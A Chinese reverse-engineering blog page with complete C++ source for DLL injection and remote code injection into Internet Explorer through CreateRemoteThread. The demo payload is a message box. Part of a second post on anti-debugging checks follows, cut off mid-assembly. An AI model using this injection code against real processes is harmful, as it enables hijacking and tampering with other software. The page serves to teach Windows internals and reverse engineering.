<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//dllinjection.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tlhelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"dllinjection.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">GetProcessIdFromName</span><span class="params">(TCHAR *szTargetProcessName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(hSnap == INVALID_HANDLE_VALUE)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    PROCESSENTRY32 pe;</span><br><span class="line">    pe.dwSize = <span class="keyword">sizeof</span>(pe);</span><br><span class="line"></span><br><span class="line">    DWORD dwProcessId = <span class="number">0</span>;</span><br><span class="line">    BOOL bResult = Process32First(hSnap, &amp;pe);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(bResult)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!lstrcmp(pe.szExeFile, szTargetProcessName))&#123;</span><br><span class="line">            dwProcessId = pe.th32ProcessID;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        bResult = Process32Next(hSnap, &amp;pe);</span><br><span class="line">    &#125;</span><br><span class="line">    CloseHandle(hSnap);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dwProcessId;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">InjectDLL</span><span class="params">(HANDLE hProcess, TCHAR *szDllPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> szDllPathLen = lstrlen(szDllPath) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    PWSTR RemoteProcessMemory = (PWSTR)VirtualAllocEx(hProcess,</span><br><span class="line">        <span class="literal">NULL</span>, szDllPathLen, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span>(RemoteProcessMemory == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    BOOL bRet = WriteProcessMemory(hProcess,</span><br><span class="line">        RemoteProcessMemory, (PVOID)szDllPath, szDllPathLen, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span>(bRet == FALSE)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    PTHREAD_START_ROUTINE pfnThreadRtn;</span><br><span class="line">    pfnThreadRtn = (PTHREAD_START_ROUTINE)GetProcAddress(</span><br><span class="line">        GetModuleHandle(<span class="string">"kernel32"</span>), <span class="string">"LoadLibraryA"</span>);</span><br><span class="line">    <span class="keyword">if</span>(pfnThreadRtn == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    HANDLE hThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">        pfnThreadRtn, RemoteProcessMemory, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span>(hThread == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    WaitForSingleObject(hThread, INFINITE);</span><br><span class="line"></span><br><span class="line">    VirtualFreeEx(hProcess,</span><br><span class="line">        RemoteProcessMemory, szDllPathLen, MEM_RELEASE);</span><br><span class="line"></span><br><span class="line">    CloseHandle(hThread);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">InjectDLLtoExistedProcess</span><span class="params">(DWORD dwPid, TCHAR *szDllPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hProcess = OpenProcess(</span><br><span class="line">        PROCESS_CREATE_THREAD | PROCESS_VM_READ | PROCESS_VM_WRITE |</span><br><span class="line">        PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION , FALSE, dwPid);</span><br><span class="line">    <span class="keyword">if</span>(hProcess == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    BOOL bJudgeWow64;</span></span><br><span class="line"><span class="comment">    IsWow64Process(hProcess, &amp;bJudgeWow64);</span></span><br><span class="line"><span class="comment">    if(bJudgeWow64 == FALSE)&#123;</span></span><br><span class="line"><span class="comment">        CloseHandle(hProcess);</span></span><br><span class="line"><span class="comment">        return -1;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span>(InjectDLL(hProcess, szDllPath))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    CloseHandle(hProcess);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">InjectDLLtoProcessFromName</span><span class="params">(TCHAR *szTarget, TCHAR *szDllPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD dwPid = GetProcessIdFromName(szTarget);</span><br><span class="line">    <span class="keyword">if</span>(dwPid == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span>(InjectDLLtoExistedProcess(dwPid, szDllPath))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">InjectDLLtoProcessFromPid</span><span class="params">(DWORD dwPid, TCHAR *szDllPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(InjectDLLtoExistedProcess(dwPid, szDllPath))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">InjectDLLtoNewProcess</span><span class="params">(TCHAR *szCommandLine, TCHAR *szDllPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    STARTUPINFO si;</span><br><span class="line">    PROCESS_INFORMATION pi;</span><br><span class="line"></span><br><span class="line">    ZeroMemory(&amp;si, <span class="keyword">sizeof</span>(STARTUPINFO));</span><br><span class="line">    si.cb = <span class="keyword">sizeof</span>(STARTUPINFO);</span><br><span class="line"></span><br><span class="line">    BOOL bResult = CreateProcess(<span class="literal">NULL</span>, szCommandLine, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">        FALSE, CREATE_SUSPENDED, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line">    <span class="keyword">if</span>(bResult == FALSE)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> nRet = <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    BOOL bJudgeWow64;</span></span><br><span class="line"><span class="comment">    IsWow64Process(pi.hProcess, &amp;bJudgeWow64);</span></span><br><span class="line"><span class="comment">    if(bJudgeWow64 == FALSE)</span></span><br><span class="line"><span class="comment">        goto _Exit;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span>(InjectDLL(pi.hProcess, szDllPath))</span><br><span class="line">        <span class="keyword">goto</span> _Exit;</span><br><span class="line"></span><br><span class="line">    nRet = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">_Exit:</span><br><span class="line">    ResumeThread(pi.hThread);</span><br><span class="line">    CloseHandle(pi.hThread);</span><br><span class="line">    CloseHandle(pi.hProcess);</span><br><span class="line">    <span class="keyword">return</span> nRet;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#运行，sampledll.dll是一个能够显示DLL加载/卸载状态消息的程序。</span></span><br><span class="line">C:\&gt;dllinjection.exe Name iexplore.exe <span class="string">"C:\\sampledll.dll"</span></span><br></pre></td></tr></table></figure>
<p>dllinjection.exe运行时以及IE关闭时都会弹出相应的消息框，“DLL-PRCCESS-ATTACH”</p>
<h2 id="4-注入函数"><a href="#4-注入函数" class="headerlink" title="4. 注入函数"></a>4. 注入函数</h2><p>用CreateRemoteThread调用了LoadLibrary。不仅仅是DLL，只要我们能够将任意函数（代码）事先复制到目标进程内部，就可以用CreateRemoteThread来运行它。</p>
<p>对IE（32为版本）注入func函数。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//codeinjection.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">HWND</span> <span class="params">(WINAPI *GETFORGROUNDWINDOW)</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(WINAPI *MSGBOX)</span><span class="params">(HWND, PCTSTR, PCTSTR, UINT)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">injectdata</span> &#123;</span></span><br><span class="line">    TCHAR szTitle[<span class="number">32</span>];</span><br><span class="line">    TCHAR szMessage[<span class="number">32</span>];</span><br><span class="line">    HANDLE hProcess;</span><br><span class="line">    PDWORD pdwCodeRemote;</span><br><span class="line">    PDWORD pdwDataRemote;</span><br><span class="line">    MSGBOX fnMessageBox;</span><br><span class="line">    GETFORGROUNDWINDOW fnGetForegroundWindow;</span><br><span class="line">&#125; INJECTDATA, *PINJECTDATA;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> DWORD WINAPI <span class="title">func</span><span class="params">(PINJECTDATA myAPI)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    myAPI-&gt;fnMessageBox((HWND)myAPI-&gt;fnGetForegroundWindow(),</span><br><span class="line">        myAPI-&gt;szMessage, myAPI-&gt;szTitle, MB_OK);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    if(myAPI-&gt;pCodeRemote != NULL)</span></span><br><span class="line"><span class="comment">        VirtualFreeEx(myAPI-&gt;hProcess,</span></span><br><span class="line"><span class="comment">        myAPI-&gt;pCodeRemote, 0, MEM_RELEASE);</span></span><br><span class="line"><span class="comment">    if(myAPI-&gt;pDataRemote != NULL)</span></span><br><span class="line"><span class="comment">        VirtualFreeEx(myAPI-&gt;hProcess,</span></span><br><span class="line"><span class="comment">        myAPI-&gt;pDataRemote, 0, MEM_RELEASE);</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">    HMODULE h = LoadLibrary(<span class="string">"user32.dll"</span>);</span><br><span class="line">    <span class="keyword">if</span>(h == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"ERR: LoadLibrary\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    INJECTDATA id;</span><br><span class="line"></span><br><span class="line">    id.fnGetForegroundWindow = (GETFORGROUNDWINDOW)</span><br><span class="line">        GetProcAddress(</span><br><span class="line">        GetModuleHandle(<span class="string">"user32"</span>), <span class="string">"GetForegroundWindow"</span>);</span><br><span class="line">        id.fnMessageBox = (MSGBOX)</span><br><span class="line">        GetProcAddress(</span><br><span class="line">        GetModuleHandle(<span class="string">"user32"</span>), <span class="string">"MessageBoxA"</span>);</span><br><span class="line"></span><br><span class="line">    lstrcpy(id.szTitle, <span class="string">"Message"</span>);</span><br><span class="line">    lstrcpy(id.szMessage, <span class="string">"Hello World!"</span>);</span><br><span class="line"></span><br><span class="line">    HWND hTarget = FindWindow(<span class="string">"IEFrame"</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span>(hTarget == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"ERR: FindWindow\n"</span>);</span><br><span class="line">        <span class="keyword">goto</span> _END1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    DWORD dwPID; <span class="comment">// PID of iexplore.exe</span></span><br><span class="line">    GetWindowThreadProcessId(hTarget, (DWORD *)&amp;dwPID);</span><br><span class="line">    id.hProcess = OpenProcess(PROCESS_CREATE_THREAD |</span><br><span class="line">        PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION |</span><br><span class="line">        PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwPID);</span><br><span class="line">    <span class="keyword">if</span>(id.hProcess == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"ERR: OpenProcess\n"</span>);</span><br><span class="line">        <span class="keyword">goto</span> _END1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    DWORD dwLen;</span><br><span class="line">    <span class="keyword">if</span>((id.pdwCodeRemote = (PDWORD)VirtualAllocEx(id.hProcess,</span><br><span class="line">        <span class="number">0</span>, <span class="number">4096</span>, MEM_COMMIT, PAGE_EXECUTE_READWRITE)) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"ERR: VirtualAllocEx(pdwCodeRemote)\n"</span>);</span><br><span class="line">        <span class="keyword">goto</span> _END2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>((id.pdwDataRemote = (PDWORD)VirtualAllocEx(id.hProcess,</span><br><span class="line">        <span class="number">0</span>, <span class="number">4096</span>, MEM_COMMIT, PAGE_EXECUTE_READWRITE)) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"ERR: VirtualAllocEx(pdwDataRemote)\n"</span>);</span><br><span class="line">        <span class="keyword">goto</span> _END3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    WriteProcessMemory(id.hProcess,</span><br><span class="line">        id.pdwCodeRemote, &amp;func, <span class="number">4096</span>, &amp;dwLen);</span><br><span class="line">    WriteProcessMemory(id.hProcess,</span><br><span class="line">        id.pdwDataRemote, &amp;id, <span class="keyword">sizeof</span>(INJECTDATA), &amp;dwLen);</span><br><span class="line"></span><br><span class="line">    HANDLE hThread = CreateRemoteThread(id.hProcess, <span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">        (LPTHREAD_START_ROUTINE)id.pdwCodeRemote, id.pdwDataRemote,</span><br><span class="line">        <span class="number">0</span>, &amp;dwLen);</span><br><span class="line">    <span class="keyword">if</span>(hThread == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"ERR: CreateRemoteThread\n"</span>);</span><br><span class="line">        <span class="keyword">goto</span> _END4;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    WaitForSingleObject(hThread, INFINITE);</span><br><span class="line">    GetExitCodeThread(hThread, (PDWORD)&amp;dwPID);</span><br><span class="line">    CloseHandle(hThread);</span><br><span class="line"></span><br><span class="line">_END4:</span><br><span class="line">    VirtualFreeEx(id.hProcess, id.pdwDataRemote, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">_END3:</span><br><span class="line">    VirtualFreeEx(id.hProcess, id.pdwCodeRemote, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">_END2:</span><br><span class="line">    CloseHandle(id.hProcess);</span><br><span class="line">_END1:</span><br><span class="line">    FreeLibrary(h);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>C:\&gt;codeinjection.exe</code> 运行。</p>
<p>启动 IE（32 位版本）的状态下运行 codeinjection.exe 时，就会将 func 函数注入到 IE 中并运行它。func 函数的功能是显示一个 Hello World! 消息框，可成功地在 IE 进程内部运行了 func 函数，这就说明代码注入成功了。</p>
<p>在 Windows 中，只要拥有足够的权限，就可以随意访问其他进程的内存空间，基本上可以自由地向其他进程注入代码，而且即便程序不是调试器，也可以比较容易地骗过其他的进程。</p>
<p>源码：链接: <a href="https://pan.baidu.com/s/1P2srPF2tPjB0DJ9IWg5PFA" target="_blank" rel="noopener">https://pan.baidu.com/s/1P2srPF2tPjB0DJ9IWg5PFA</a> 密码: efrs</p>

      

      
    </div>
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<i class="icon-price-tags icon"></i>
		<ul class="article-tag-list">
			 
        		<li class="article-tag-list-item">
        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">reverse</a>
        		</li>
      		
		</ul>
	</div>

      

      
        <p class="article-more-link">
          <a class="article-more-a" href="/2018/07/05/代码注入/">展开全文 >></a>
        </p>
      

      
      <div class="clearfix"></div>
    </div>
  </div>
</article>

<aside class="wrap-side-operation">
    <div class="mod-side-operation">
        
        <div class="jump-container" id="js-jump-container" style="display:none;">
            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
                <i class="icon-font icon-back"></i>
            </a>
            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
                <i class="icon-font icon-plane jump-plane"></i>
            </div>
        </div>
        
        
    </div>
</aside>




  
    <article id="post-如何防止软件被别人逆向" class="article article-type-post  article-index" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/06/06/如何防止软件被别人逆向/">如何防止软件被别人逆向</a>
    </h1>
  

        
        <a href="/2018/06/06/如何防止软件被别人逆向/" class="archive-article-date">
  	<time datetime="2018-06-06T14:35:18.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-06-06</time>
</a>
        
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>在开发的时候调试技术为我们能带来便利，但是软件发布之后不想被拿去分析，比如一些涉及到金钱利益相关的软件和游戏（外挂），看了些书，了解了一些防逆向的技术，稍做总结。</p>
<h2 id="1-反调试技术"><a href="#1-反调试技术" class="headerlink" title="1.反调试技术"></a>1.反调试技术</h2><h3 id="1-IsDebuggerPresent"><a href="#1-IsDebuggerPresent" class="headerlink" title="1.IsDebuggerPresent"></a>1.IsDebuggerPresent</h3><p><strong>IsDebuggerPresent</strong> ：</p>
<p>Determines whether the calling process is being debugged by a user-mode debugger.</p>
<p>一种能够检测是否挂载了调试器的 API 函数，通过返回值是否为 0 可以判断调试器的挂载状态。</p>
<p><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms680345%28v=vs.85%29.aspx" target="_blank" rel="noopener">具体见MASN文档</a></p>
<p>可以通过简单的小程序说明一下。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(IsDebuggerPresent())&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"on debugger\n"</span>);<span class="comment">//在调试器上运行！</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"not on debugger\n"</span>);<span class="comment">// 在调试器上不运行</span></span><br><span class="line">    &#125;</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>如何用</strong>：开发时用 ifdef 或者注释来暂时禁用 IsDebuggerPresent 的调用，在发布版上再启用，在检测到调试器时改变程序的逻辑。</p>
<p>类似的还有一些API函数，比如</p>
<h3 id="2-CheckRemoteDebuggerPresent"><a href="#2-CheckRemoteDebuggerPresent" class="headerlink" title="2.CheckRemoteDebuggerPresent"></a>2.CheckRemoteDebuggerPresent</h3><p><strong>CheckRemoteDebuggerPresent</strong>：</p>
<p>Determines whether the specified process is being debugged.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL WINAPI <span class="title">CheckRemoteDebuggerPresent</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_    HANDLE hProcess,</span></span></span><br><span class="line"><span class="function"><span class="params">  _Inout_ PBOOL  pbDebuggerPresent</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<h3 id="3-popf和SINGLE-STEP异常"><a href="#3-popf和SINGLE-STEP异常" class="headerlink" title="3.popf和SINGLE_STEP异常"></a>3.popf和SINGLE_STEP异常</h3><p>利用 popf 和 SINGLE_STEP 异常来检测调试器的方法。当返回值为 0 时为正常，为 1 则表示挂载了调试器。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">__declspec(naked) int __stdcall antidebugger1(void)</span><br><span class="line">&#123;</span><br><span class="line">    __asm&#123;</span><br><span class="line">        pushad</span><br><span class="line">        push ok</span><br><span class="line">        push dword ptr fs:[0]</span><br><span class="line">        mov dword ptr fs:[0], esp</span><br><span class="line">        mov buff, esp</span><br><span class="line">        push 100h      ;用push将100h入栈</span><br><span class="line">        popf           ;用pop将100h取出至标志</span><br><span class="line">        jmp error</span><br><span class="line">ok:</span><br><span class="line">        mov esp, buff</span><br><span class="line">        pop dword ptr fs:[0]</span><br><span class="line">        add esp, 4</span><br><span class="line">        popad</span><br><span class="line">        xor eax, eax</span><br><span class="line">        ret</span><br><span class="line">error:</span><br><span class="line">        mov esp, buff</span><br><span class="line">        pop dword ptr fs:[0]</span><br><span class="line">        add esp, 4</span><br><span class="line">        popad</span><br><span class="line">        xor eax, eax</span><br><span class="line">        inc eax</span><br><span class="line">        